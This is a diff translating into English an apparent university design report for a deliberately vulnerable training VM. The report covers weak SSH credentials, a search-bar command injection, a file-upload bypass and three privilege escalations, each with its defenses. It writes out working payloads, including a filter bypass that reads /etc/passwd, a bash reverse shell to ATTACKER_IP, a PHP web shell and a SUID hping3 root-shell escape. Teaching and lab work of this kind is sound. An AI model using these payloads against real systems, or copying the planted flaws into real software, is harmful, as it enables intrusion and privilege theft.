@@ -1,57 +1,57 @@
 # Boot2Root VM Design: Waifu Gallery – Artificial Vulnerability Orchestration
 
-## Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato
+## Academic Project: Design and Implementation of a Controlled Vulnerable Environment
 
-**Contexto del Progetto:**
-- **Ateneo:** Sapienza Università di Roma, Dipartimento di Cybersecurity
-- **Corso:** Ethical Hacking & Penetration Testing (A.A. 2023/24)
-- **Ruolo:** Lead Architect & Full-Stack Developer (6 vulnerabilità, 3 livelli di difficoltà)
-- **Target:** Progettazione di una macchina virtuale vulnerabile destinata a simulazioni didattiche in ambiente d'esame
-- **Deliverable:** VM Linux funzionante + Report tecnico ufficiale + Codice sorgente
+**Project Context:**
+- **University:** Sapienza University of Rome, Cybersecurity Department
+- **Course:** Ethical Hacking & Penetration Testing (A.Y. 2023/24)
+- **Role:** Lead Architect & Full-Stack Developer (6 vulnerabilities, 3 difficulty levels)
+- **Target:** Design of a vulnerable virtual machine intended for educational simulations in an exam environment
+- **Deliverable:** Working Linux VM + Official technical report + Source code
 
-**Perché questo progetto è rilevante per la cybersecurity:**
-Gli studenti non dovevano solo trovare vulnerabilità: dovevano capire come combinarle, seguendo il path footprint → access → privilege escalation.
+**Why this project is relevant to cybersecurity:**
+Students weren't just supposed to find vulnerabilities: they had to understand how to chain them together, following the footprint → access → privilege escalation path.
 
-**Tecnologie & Stack:**
-- **Sistema Operativo:** Ubuntu 20.04.6 LTS
+**Technologies & Stack:**
+- **Operating System:** Ubuntu 20.04.6 LTS
 - **Web Stack:** Apache2 + PHP
-- **Backend Logic:** Bash scripting, C (compilazione di exploit)
-- **Vulnerabilità Implementate:** 6 distinte (3 Access Vectors, 3 Privilege Escalation), livelli Easy/Medium/Hard
-- **Infrastructure:** Git versioning per tracking di design decisions
+- **Backend Logic:** Bash scripting, C (exploit compilation)
+- **Implemented Vulnerabilities:** 6 distinct (3 Access Vectors, 3 Privilege Escalations), Easy/Medium/Hard levels
+- **Infrastructure:** Git versioning for tracking design decisions
 
 ---
 
-## 1. Concept & Architettura del Sistema
+## 1. System Concept & Architecture
 
-### 1.1 Come l'Abbiamo Pensata
+### 1.1 How We Thought It Out
 
-Abbiamo deciso di non fare il solito "Linux VM con 6 flag nascosti" banale. Volevamo qualcosa che:
+We decided not to make the usual boring "Linux VM with 6 hidden flags". We wanted something that:
 
-1. **Fosse realistica** – Una web gallery è qualcosa che studenti hanno veramente visto online, non un ambiente astratto
-2. **Avesse una trama** – Il tema anime non è casuale: il prof ama gli anime, quindi è venuto naturale. Ma importante: gli hint sono nella UI (tooltip sulle immagini), quindi per trovarli serve fare OSINT sul sito, non leggere il codice
-3. **Fosse progressivo** – Easy vulnerabilità per capire il flusso, Medium per imparare il bypass che funziona, Hard per chi ha capito bene
+1. **Was realistic** – A web gallery is something students have actually seen online, not an abstract environment
+2. **Had a storyline** – The anime theme wasn't random: the professor loves anime, so it came naturally. But importantly: the hints are in the UI (tooltips on images), so finding them requires OSINT on the site, not reading the codebase
+3. **Was progressive** – Easy vulnerabilities to understand the flow, Medium to learn bypasses that actually work, Hard for those who really grasped the concepts
 
-**La Scelta: Waifu Gallery**
-Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (quegli anni c'erano), è un web service che effettivamente è stata una cosa, e gli studenti sapevano già di cosa parlavamo. Non ti devi spiegare "cosa è una gallery", sai già che è un sito dove scrolli immagini.
+**The Choice: Waifu Gallery**
+A mid-2000s anime character gallery. Why? Because it's believable (they existed back then), it's a web service that was actually a thing, and students already knew what we were talking about. You don't have to explain "what a gallery is", you already know it's a site where you scroll through images.
 
-### 1.2 Architettura: Dove Abbiamo Messo Cosa
+### 1.2 Architecture: Where We Put What
 
-Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'attaccante doveva muoversi in ordine:
+Every vulnerability had to be in a specific place on the system. This way the attacker had to move sequentially:
 
-| Componente | Cosa È | Dove Attaccare |
+| Component | What It Is | Where To Attack |
 |---|---|---|
-| **Frontend** | Galleria PHP con barra ricerca | Web Command Injection (search bar) |
-| **Upload nascosto** | imposter.php (non linkato) | File Upload bypass doppia estensione |
-| **Backend Filters** | Blacklist comandi +regex | Bypassabile con `;;` e `##` |
-| **System User** | `amogus` con password `sus1` | SSH brute-force (nome scopribile da hint UI) |
-| **hping3 SUID** | Binary con bit SUID attivo | Root shell istantanea |
-| **Cronjob** | Script scrivibile, eseguito come root | PATH hijacking |
-| **ld.so config** | Libreria in path scrivibile | Library hijacking + assembly custom |
+| **Frontend** | PHP gallery with search bar | Web Command Injection (search bar) |
+| **Hidden upload** | imposter.php (unlinked) | File Upload double extension bypass |
+| **Backend Filters** | Command blacklist + regex | Bypassable with `;;` and `##` |
+| **System User** | `amogus` with password `sus1` | SSH brute-force (name discoverable via UI hint) |
+| **hping3 SUID** | Binary with active SUID bit | Instant root shell |
+| **Cronjob** | Writable script, executed as root | PATH hijacking |
+| **ld.so config** | Library in writable path | Library hijacking + custom assembly |
 
-**Progressione pensata:**
-- **Easy:** Scopri l'utente dalla UI => brute-force SSH => trovi SUID hping3
-- **Medium:** Bypassa il filtro di ricerca web => scopri il cronjob, modifichi e aspetti per la root rev. shell
-- **Hard:** Trovi imposter.php e busti il filtro upload => crei la libreria in C malevola, la sostituisci, hijacki ld.so
+**Designed Progression:**
+- **Easy:** Discover the user from the UI => SSH brute-force => find SUID hping3
+- **Medium:** Bypass the web search filter => discover the cronjob, modify it and wait for the root rev shell
+- **Hard:** Find imposter.php and bust the upload filter => create the malicious C library, swap it, hijack ld.so
 
 ---
 
@@ -59,87 +59,87 @@ Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'atta
 
 ### 2.1 Vulnerability Summary Matrix
 
-| #  | Nome Vulnerabilità | Categoria | Difficoltà | Prerequisiti | Post-Exploitation |
+| #  | Vulnerability Name | Category | Difficulty | Prerequisites | Post-Exploitation |
 |----|----|---|---|---|---|
-| **3.1** | Weak SSH Credentials | Initial Access | ⭐ EASY | Nessuno (brute-force pubblico) | Shell utente `amogus` |
-| **3.2** | Web Command Injection | Lateral Escalation | ⭐⭐ MEDIUM | Accesso a web app (default) | RCE come www-data user |
-| **3.3** | File Upload + Shell Execution | RCE | ⭐⭐⭐ HARD | Riconoscimento pagina nascosta + upload bypass + esecuzione | Shell www-data + persistent backdoor |
-| **4.1** | SUID Binary Exploitation (hping3) | Privilege Escalation | ⭐ EASY | Shell utente non-root | Shell root immediata |
-| **4.2** | Insecure Cronjob PATH | Privilege Escalation | ⭐⭐ MEDIUM | Accesso utente + attesa timing | Shell root (da reverse shell) |
-| **4.3** | LD_LIBRARY_PATH Hijacking | Privilege Escalation | ⭐⭐⭐ HARD | SUID binary + writable library path + C compilation skills | Shell root |
+| **3.1** | Weak SSH Credentials | Initial Access | ⭐ EASY | None (public brute-force) | `amogus` user shell |
+| **3.2** | Web Command Injection | Lateral Escalation | ⭐⭐ MEDIUM | Web app access (default) | RCE as www-data user |
+| **3.3** | File Upload + Shell Execution | RCE | ⭐⭐⭐ HARD | Uncover hidden page + upload bypass + execution | www-data shell + persistent backdoor |
+| **4.1** | SUID Binary Exploitation (hping3) | Privilege Escalation | ⭐ EASY | Non-root user shell | Instant root shell |
+| **4.2** | Insecure Cronjob PATH | Privilege Escalation | ⭐⭐ MEDIUM | User access + wait timing | Root shell (from reverse shell) |
+| **4.3** | LD_LIBRARY_PATH Hijacking | Privilege Escalation | ⭐⭐⭐ HARD | SUID binary + writable library path + C compilation skills | Root shell |
 
 ### 2.2 Attack Chain Visualization
 
 ```
 ┌─────────────────────────────────────────────────────────┐
 │ INITIAL ACCESS                                          │
-│ ├─ [3.1] SSH brute-force (amogus:sus1)      ← Easiest  │
-│ └─ [3.1] HTTP Reconnaissance → UI hints               │
+│ ├─ [3.1] SSH brute-force (amogus:sus1)      ← Easiest   │
+│ └─ [3.1] HTTP Reconnaissance → UI hints                 │
 └────────────────────┬────────────────────────────────────┘
                      │
                      ▼
 ┌─────────────────────────────────────────────────────────┐
 │ LATERAL MOVEMENT / WEB RCE                              │
-│ ├─ [3.2] Command Injection via search bar  ← Via ;;##  │
-│ │         shell_exec() bypass                          │
-│ └─ [3.3] Hidden upload page (imposter.php)            │
-│          shell.php.jpg double extension bypass         │
+│ ├─ [3.2] Command Injection via search bar  ← Via ;;##   │
+│ │         shell_exec() bypass                           │
+│ └─ [3.3] Hidden upload page (imposter.php)              │
+│          shell.php.jpg double extension bypass          │
 └────────────────────┬────────────────────────────────────┘
                      │
                      ▼
 ┌─────────────────────────────────────────────────────────┐
 │ PRIVILEGE ESCALATION (Choose One)                       │
-│ ├─ [4.1] SUID hping3 → /bin/sh -p         ← Simplest   │
-│ ├─ [4.2] Cronjob PATH manipulation                     │
-│ └─ [4.3] LD_LIBRARY_PATH hijacking        ← Complex    │
+│ ├─ [4.1] SUID hping3 → /bin/sh -p         ← Simplest    │
+│ ├─ [4.2] Cronjob PATH manipulation                      │
+│ └─ [4.3] LD_LIBRARY_PATH hijacking        ← Complex     │
 └─────────────────────────────────────────────────────────┘
 ```
 
-**Chiave Didattica:**
-Ogni livello dimostra concetti reali riscontrati in engagement professionali:
-- **Easy:** Reconnaissance basica + weak credentials (es. Spring4Shell, ProxyLogon preliminary phases)
-- **Medium:** Sanitizzazione insufficiente + misunderstanding di shell metacharacters
-- **Hard:** Understanding profondo di ELF loader + exploitation of complex privilege boundaries
+**Educational Key:**
+Each level demonstrates real-world concepts found in professional engagements:
+- **Easy:** Basic reconnaissance + weak credentials (e.g., Spring4Shell, ProxyLogon preliminary phases)
+- **Medium:** Insufficient sanitization + misunderstanding of shell metacharacters
+- **Hard:** Deep understanding of ELF loaders + exploitation of complex privilege boundaries
 
 ---
 
-## 3. Vulnerabilità di Accesso (Implementazione Personale)
+## 3. Access Vulnerabilities (Custom Implementation)
 
-In questa sezione vengono descritti i vettori di ingresso progettati e implementati per consentire all'attaccante di ottenere il primo accesso al sistema.
+This section describes the entry vectors designed and implemented to allow the attacker to gain initial access to the system.
 
 ### 3.1 Weak SSH Credentials – Easy Mode
 
 #### Setup
-L'utente `amogus` con password `sus1` è il primo indizio. Il nome è un riferimento ad Among Us (il gioco), che all'epoca era famoso nei nostri gruppi di studio. Sapevamo che gli altri studenti lo avrebbero riconosciuto.
+The user `amogus` with password `sus1` is the first clue. The name is a reference to Among Us (the game), which was popular in our study groups at the time. We knew the other students would recognize it.
 
-La password non è nella UI da nessuna parte, ma il nome sì: se apri il DevTools e ispezioni una qualunque immagine della gallery, vedi:
+The password isn't in the UI anywhere, but the username is: if you open DevTools and inspect any image in the gallery, you see:
 ```html
 <img src="..." title="amogus" ...>
 ```
 
-Quindi per risolvere questa vulnerabilità serve:
-1. Osservare la UI (aprire inspector del browser)
-2. Identificare il titolo nascosto
-3. Tentare brute-force su SSH con quel nome
+So to solve this vulnerability you need to:
+1. Observe the UI (open browser inspector)
+2. Identify the hidden title
+3. Attempt SSH brute-force with that username
 
-#### L'Exploit
+#### The Exploit
 ```bash
-# Reconnaissance: passa il mouse su un'immagine, vedi il tooltip
-# Oppure F12 → Inspector, cerca title attribute
+# Reconnaissance: hover over an image, see the tooltip
+# Or F12 → Inspector, look for title attribute
 
-# Brute-force SSH
+# SSH Brute-force
 hydra -l amogus -P wordlist.txt ssh://<vm_ip>
-# Oppure: ssh amogus@<vm_ip> con password "sus1"
+# Or: ssh amogus@<vm_ip> with password "sus1"
 ```
 
-È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico sforzo è capire che vai su SSH, non sul web app.
+It's Easy because there's no hidden logic: the name is visible in the UI, the password is trivial. The only effort is understanding you need to hit SSH, not the web app.
 
 ### 3.2 Web Command Injection – Medium Mode
 
-#### La Vulnerabilità
-La search bar fa ricerca di immagini con `shell_exec("ls $image_folder$query*.jpg")`.Il filtro era blacklist-based: blocca bash, nc, wget, comandi specifici. Però abbiamo volutamente lasciato un buco.
+#### The Vulnerability
+The search bar performs an image search using `shell_exec("ls $image_folder$query*.jpg")`. The filter was blacklist-based: it blocks bash, nc, wget, and specific commands. However, we intentionally left a hole.
 
-Se usi `;` o `#` direttamente, viene bloccato. MA se usi `;;` e `##`, il filtro le riconosce come "doppi" e le permette. Poi c'è un `str_replace()` che li converte in singoli:
+If you use `;` or `#` directly, it gets blocked. BUT if you use `;;` and `##`, the filter recognizes them as "doubles" and allows them. Then there's an `str_replace()` that converts them back to singles:
 ```php
 if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
     $query = str_replace(";;", ";", $query);    // ;; -> ;
@@ -147,110 +147,110 @@ if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
 }
 ```
 
-Il problema: il controllo PRIMA della sostituzione. Quindi `;;ls /##` passa il filtro perché `;;` non è `;`, non viene bloccato.
+The problem: the check happens BEFORE the replacement. So `;;ls /##` bypasses the filter because `;;` is not `;`, so it doesn't get blocked.
 
-#### Come Risolverla
+#### How to Solve It
 ```bash
-# Payload diretti
-;;ls /##            # Elenca root directory
-;;cat /etc/passwd##  # Legge file sensibili
-;;whoami##          # Vedi chi sei
+# Direct payloads
+;;ls /##            # Lists root directory
+;;cat /etc/passwd##  # Reads sensitive files
+;;whoami##          # See who you are
 
-# Payload più complessi (reverse shell):
+# More complex payloads (reverse shell):
 ;;bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1##
 ```
 
-**Difesa:**
-Non usare `shell_exec` con input user. O se lo fai:
-1. **Whitelist** – accetta solo caratteri sicuri: `preg_replace('/[^a-zA-Z0-9_-]/', '', $query)`
-2. **escapeshellarg()** – se proprio devi usare shell_exec: `escapeshellarg($query)`
-3. **Meglio: PHP native** – `glob("images/{$query}*.jpg")` senza shell
+**Defense:**
+Do not use `shell_exec` with user input. Or if you must:
+1. **Whitelist** – only accept safe characters: `preg_replace('/[^a-zA-Z0-9_-]/', '', $query)`
+2. **escapeshellarg()** – if you absolutely must use shell_exec: `escapeshellarg($query)`
+3. **Better: native PHP** – `glob("images/{$query}*.jpg")` without using the shell
 
 ### 3.3 File Upload Bypass – Hard Mode
 
-#### L'Idea
-Abbiamo creato una pagina nascosta `imposter.php` che non è linkata da nessuna parte. Se la trovi e accedi, puoi uploadare un file.
+#### The Idea
+We created a hidden page `imposter.php` that isn't linked anywhere. If you find it and access it, you can upload a file.
 
-Il filtro controlla solo l'estensione finale via `pathinfo()`. Quindi:
-- `shell.php.jpg` → estensione = `.jpg` ✅ passa il filtro
-- Ma il file si salva come `shell.php.jpg` e se Apache lo esegue come PHP → RCE
+The filter only checks the final extension using `pathinfo()`. Therefore:
+- `shell.php.jpg` → extension = `.jpg` ✅ bypasses the filter
+- But the file gets saved as `shell.php.jpg` and if Apache executes it as PHP → RCE
 
-#### Come la Trovi
+#### How to Find It
 ```bash
 # 1. Brute force
 gobuster dir -u http://<vm_ip> -w /usr/share/wordlists/common.txt
-# Scopri imposter.php
+# Discover imposter.php
 
-# 2. O se hai RCE dalla command injection:
+# 2. Or if you have RCE from command injection:
 cat index.php | grep -i "upload\|form\|POST"  # Find links to imposter.php
 ```
 
-#### L'Exploit
+#### The Exploit
 ```bash
-# Crea una web shell
+# Create a web shell
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
-# Rinomina con doppia estensione
+# Rename with double extension
 mv shell.php shell.php.jpg
 
 # Upload
 curl -F "image=@shell.php.jpg" http://<vm_ip>/imposter.php
 
-# Esegui
+# Execute
 curl "http://<vm_ip>/images/shell.php.jpg?cmd=id"
 # uid=33(www-data) ...
 ```
 
-#### Difesa
-1. **Controlla magic bytes** – Non extension. `getimagesize()` verifica se è davvero un'immagine
-2. **Rinomina il file** - Genera nome random: `bin2hex(random_bytes(16)) . ".jpg"`
-3. **Store outside webroot** - Salva in `/var/uploads/`, non dove Apache può eseguire
-4. **Disabilita PHP execution** nella cartella upload (.htaccess o web.config)
+#### Defense
+1. **Check magic bytes** – Not extension. `getimagesize()` verifies if it's genuinely an image
+2. **Rename the file** - Generate a random name: `bin2hex(random_bytes(16)) . ".jpg"`
+3. **Store outside webroot** - Save it in `/var/uploads/`, not where Apache can execute it
+4. **Disable PHP execution** in the upload folder (.htaccess or web.config)
 
-## 4. Privilege Escalation – Come Diventare Root
+## 4. Privilege Escalation – How to Become Root
 
 ### 4.1 SUID hping3 – Easy
 
-#### Cos'è hping3?
-`hping3` è un packet crafting tool, simile a `ping` ma con stereoidi. Si usa per testare firewall, creare pacchetti custom, roba così. NON dovrebbe mai avere SUID.
+#### What is hping3?
+`hping3` is a packet crafting tool, similar to `ping` but on steroids. It's used to test firewalls, create custom packets, stuff like that. It should NEVER have SUID.
 
-#### L'Exploit
+#### The Exploit
 ```bash
-# Enumerare SUID binaries
+# Enumerate SUID binaries
 find / -perm -4000 -type f 2>/dev/null | grep hping
 # Output: /usr/sbin/hping3
 
-# Eseguire hping3 (che è SUID root)
+# Execute hping3 (which is SUID root)
 $ /usr/sbin/hping3
 hping3 > /bin/sh -p
 
-# Boom, sei root
+# Boom, you're root
 $ whoami
 root
 ```
 
-La flag `-p` di `/bin/sh` è critica: "preserve mode". Senza, la shell droppa i privilegi automaticamente.
+The `-p` flag in `/bin/sh` is critical: "preserve mode". Without it, the shell drops privileges automatically.
 
-#### Perché funziona
-`hping3` con SUID esegue come root. Dentro hping3 c'è una funzionalità di shell escape. Chiedi una shell, e il processo (che è root) te la dà. Easy.
+#### Why it works
+`hping3` with SUID executes as root. Inside hping3 there is a shell escape feature. You ask for a shell, and the process (which is root) gives it to you. Easy.
 
-#### Difesa
+#### Defense
 ```bash
 # Remove SUID
 chmod -s /usr/sbin/hping3
 
-# Oppure usare sudo con logging:
+# Or use sudo with logging:
 # sudoers: amogus ALL=(root) NOPASSWD: /usr/sbin/hping3
 ```
 
 ### 4.2 Cronjob PATH Hijacking – Medium
 
-#### Come Funziona
-Cronjob (cron) è un Linux scheduler che esegue scripts periodicamente. Se:
-- Lo script viene eseguito **come root** ma è **scrivibile da non-root**
-- E usa **path relativo** per eseguire comandi
+#### How It Works
+A Cronjob (cron) is a Linux scheduler that runs scripts periodically. If:
+- The script is executed **as root** but is **writable by non-root**
+- And it uses **relative paths** to execute commands
 
-Allora dirottiamo gli eseguibili aggiungendo una directory fake al PATH dove creiamo eseguibili nostri con lo stesso nome. Quando cron esegue il comando, trova il nostro fake.
+Then we can hijack the executables by adding a fake directory to the PATH where we create our own executables with the same name. When cron runs the command, it finds our fake one.
 
 #### Vulnerability Discovery Phase
 
@@ -345,17 +345,17 @@ chmod 750 /home/developer/overwrite.sh
 
 ### 4.3 LD.SO Hijacking – Hard
 
-#### Come Funziona L'ELF Loader
-L'ELF loader (`ld.so`) risolve le librerie dinamiche che un programma ha bisogno al runtime. Segue un ordine di ricerca specifico:
+#### How The ELF Loader Works
+The ELF loader (`ld.so`) resolves the dynamic libraries that a program needs at runtime. It follows a specific search order:
 
 ```
-1. LD_LIBRARY_PATH (variabile ambiente)
-2. /etc/ld.so.cache (cache compilata)
-3. /etc/ld.so.conf e /etc/ld.so.conf.d/ (config di sistema)
+1. LD_LIBRARY_PATH (environment variable)
+2. /etc/ld.so.cache (compiled cache)
+3. /etc/ld.so.conf and /etc/ld.so.conf.d/ (system configs)
 4. Standard dirs: /lib, /usr/lib, /lib64, /usr/lib64
 ```
 
-Se un binary SUID cerca una libreria in una directory **scrivibile**, possiamo mettere lì la nostra versione malware e il binary SUID la carica.
+If a SUID binary searches for a library in a **writable** directory, we can place our malware version there and the SUID binary will load it.
 
 #### Discovery: Finding the Vulnerable Binary
 
@@ -457,11 +457,11 @@ gcc -o testingapp testingapp.c -lcustomapp -Wl,-rpath=/usr/local/lib/secure
 # Ignores LD_LIBRARY_PATH and /etc/ld.so.conf.d/
 ```
 
-## 5. Come Ripararlo – Strategie di Defense
+## 5. How To Fix It – Defense Strategies
 
-### 5.1 Priorità di Fix
+### 5.1 Fix Priorities
 
-| Vulnerabilità | Severity | Remediation Primary | Tempo Impl. | Effort | Collaudo |
+| Vulnerability | Severity | Primary Remediation | Impl. Time | Effort | Testing |
 |---|---|---|---|---|---|
 | 3.1 (Weak SSH) | CRITICAL | SSH key-based + strong policy | 2 hrs | LOW | `ssh-keygen -t ed25519` |
 | 3.2 (Cmd Inject) | CRITICAL | Sanitize input + use whitelist | 4 hrs | MEDIUM | `escapeshellarg()` test |
@@ -470,22 +470,22 @@ gcc -o testingapp testingapp.c -lcustomapp -Wl,-rpath=/usr/local/lib/secure
 | 4.2 (Cronjob) | HIGH | Absolute paths + restrictive PATH | 1 hr | MEDIUM | Monitor cron execution |
 | 4.3 (ld.so) | HIGH | Remove unsafe ld.so.conf.d entries | 30 min | LOW | Verify ld.so.conf.d |
 
-### 5.2 La Strategia Di Difesa
+### 5.2 The Defense Strategy
 
-**Da Fare Subito (Riparare le Vulnerabilità Web):**
-1. Non usare funzioni pericolose come `shell_exec()` senza sanitizing
-2. Se proprio necessario, whitelist solo i caratteri sicuri (lettere, numeri, wildcard `*`)
-3. Upload files: controlla magic bytes, non solo estensione
-4. Disabilita PHP in `/images/` con `.htaccess` (Apache) o nginx config
+**To Do Immediately (Fixing Web Vulnerabilities):**
+1. Do not use dangerous functions like `shell_exec()` without sanitizing
+2. If absolutely necessary, strictly whitelist safe characters (letters, numbers, wildcard `*`)
+3. Upload files: check magic bytes, not just the extension
+4. Disable PHP execution in `/images/` using `.htaccess` (Apache) or nginx config
 
-**Dopo (Elimina i Privilege Escalation):**
-5. Togli SUID da binari non necessari
-6. SSH: usa solo key-based auth, password disabled
-7. Cronjob: sempre path assoluto, mai relativo
-8. LD.SO: audita `/etc/ld.so.conf.d/`, rimuovi path user-writable
-9. Controllo mensile di SUID binary con `find / -perm -4000`
+**Next (Eliminate Privilege Escalations):**
+5. Remove SUID from unnecessary binaries
+6. SSH: enforce key-based auth only, disable password logins
+7. Cronjobs: always use absolute paths, never relative
+8. LD.SO: audit `/etc/ld.so.conf.d/`, remove user-writable paths
+9. Monthly check for SUID binaries using `find / -perm -4000`
 
-**Ongoing (Monitoraggio):**
-10. Scan di web input periodicamente
-11. Audit file permission (monthly)
-12. Log analysis per accessi non autorizzati
+**Ongoing (Monitoring):**
+10. Periodically scan web inputs
+11. Audit file permissions (monthly)
+12. Log analysis for unauthorized access attempts
